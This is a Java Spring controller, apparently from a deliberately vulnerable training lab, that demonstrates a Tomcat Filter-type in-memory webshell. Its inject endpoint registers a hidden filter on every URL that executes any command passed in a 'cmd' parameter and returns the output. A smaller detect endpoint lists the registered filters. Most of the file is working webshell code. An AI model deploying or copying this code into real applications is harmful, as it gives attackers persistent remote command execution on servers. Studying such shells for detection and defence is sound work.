package top.whgojp.modules.mshell.controller;

import io.swagger.annotations.Api;
import io.swagger.annotations.ApiOperation;
import io.swagger.annotations.ApiParam;
import lombok.extern.slf4j.Slf4j;
import org.apache.catalina.Context;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;
import top.whgojp.common.utils.R;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;

/**
 * Filter型内存马
 * 通过动态注册Filter实现命令执行
 * 
 * @author whgojp
 * @date 2024/03/20
 */
@Slf4j
@Api(tags = "Filter型内存马")
@Controller
@RequestMapping("/mshell/filter")
public class FilterMemShellController extends BaseMemShellController {

    @RequestMapping("")
    public String index() {
        return "vul/mshell/filter";
    }

    @ApiOperation("注入Filter型内存马")
    @PostMapping("/inject")
    @ResponseBody
    public R inject(
            @ApiParam("过滤器名称") @RequestParam(defaultValue = "evilFilter") String filterName,
            @ApiParam("URL Pattern") @RequestParam(defaultValue = "/*") String urlPattern,
            @ApiParam("命令参数名") @RequestParam(defaultValue = "cmd") String cmdParam) {
        try {
            Context context = getContext();
            if (context == null) {
                return R.error("获取Context失败");
            }

            // 创建恶意Filter
            Filter evilFilter = new Filter() {
                @Override
                public void init(FilterConfig filterConfig) {}

                @Override
                public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) 
                        throws IOException, ServletException {
                    HttpServletRequest req = (HttpServletRequest) request;
                    HttpServletResponse resp = (HttpServletResponse) response;
                    
                    String cmd = req.getParameter(cmdParam);
                    if (cmd != null) {
                        try {
                            Process process = Runtime.getRuntime().exec(cmd);
                            InputStream in = process.getInputStream();
                            byte[] b = new byte[1024];
                            int n;
                            while ((n = in.read(b)) != -1) {
                                resp.getOutputStream().write(b, 0, n);
                            }
                            resp.getOutputStream().flush();
                            return;
                        } catch (IOException e) {
                            log.error("命令执行失败", e);
                            resp.getWriter().println("Error: " + e.getMessage());
                            return;
                        }
                    }
                    chain.doFilter(request, response);
                }

                @Override
                public void destroy() {}
            };

            // 创建FilterDef
            FilterDef filterDef = new FilterDef();
            filterDef.setFilterName(filterName);
            filterDef.setFilterClass(evilFilter.getClass().getName());
            filterDef.setFilter(evilFilter);

            // 创建FilterMap
            FilterMap filterMap = new FilterMap();
            filterMap.setFilterName(filterName);
            filterMap.addURLPattern(urlPattern);

            // 注册Filter
            StandardContext standardContext = (StandardContext) context;
            standardContext.addFilterDef(filterDef);
            standardContext.addFilterMap(filterMap);

            log.info("Filter型内存马注入成功，名称: {}, URL Pattern: {}, 命令参数: {}", 
                    filterName, urlPattern, cmdParam);
            return R.ok("内存马注入成功").put("data", String.format(
                    "Filter名称: %s\nURL Pattern: %s\n命令参数: %s", 
                    filterName, urlPattern, cmdParam));
        } catch (Exception e) {
            log.error("注入失败", e);
            return R.error("注入失败：" + e.getMessage());
        }
    }

    @ApiOperation("检测Filter型内存马")
    @GetMapping("/detect")
    @ResponseBody
    public R detect() {
        try {
            Context context = getContext();
            if (context == null) {
                return R.error("获取Context失败");
            }

            StringBuilder result = new StringBuilder();
            result.append("已注入的过滤器列表：\n");

            // 获取所有Filter配置
            FilterDef[] filterDefs = ((StandardContext) context).findFilterDefs();
            for (FilterDef filterDef : filterDefs) {
                result.append("- Filter名称: ").append(filterDef.getFilterName())
                      .append("\n  类型: ").append(filterDef.getFilterClass())
                      .append("\n  实例: ").append(filterDef.getFilter() != null ? 
                              filterDef.getFilter().getClass().getName() : "未实例化")
                      .append("\n");
            }

            return R.ok().put("data", result.toString());
        } catch (Exception e) {
            log.error("检测失败", e);
            return R.error("检测失败：" + e.getMessage());
        }
    }
}
